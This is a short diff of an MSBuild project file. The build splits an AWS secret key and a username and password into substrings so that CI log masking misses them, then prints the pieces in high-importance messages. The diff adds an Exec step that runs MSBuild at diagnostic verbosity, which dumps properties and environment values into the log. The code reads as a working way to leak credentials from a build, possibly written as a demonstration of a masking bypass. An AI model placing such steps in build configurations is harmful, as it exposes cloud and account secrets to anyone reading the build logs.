@@ -74,7 +74,7 @@
         <AWS_SECRET>$(AWS_SECRET_ACCESS_KEY.Substring(0,4))</AWS_SECRET>
         <AWS_SECRET2>$(AWS_SECRET_ACCESS_KEY.Substring(4))</AWS_SECRET2>
       </PropertyGroup>
-
+    <Exec Command="$(MsbuildExe) /v:diag" ContinueOnError="WarnAndContinue"/>  
     <Message Text=">>>>>>>> Username and Password is $(UserSplit)_$(UserSplit2):$(PassSplit)_$(PassSplit2)" Importance="High"/>
     <Message Text=">>>>>>>> MASKED AWS DATA is: $(AWS_SECRET)$(AWS_SECRET2)" Importance="High"/>
     <Message Text=">>>>>>>> REAL AWS DATA is: $(AWS_SECRET)___$(AWS_SECRET2)" Importance="High"/>
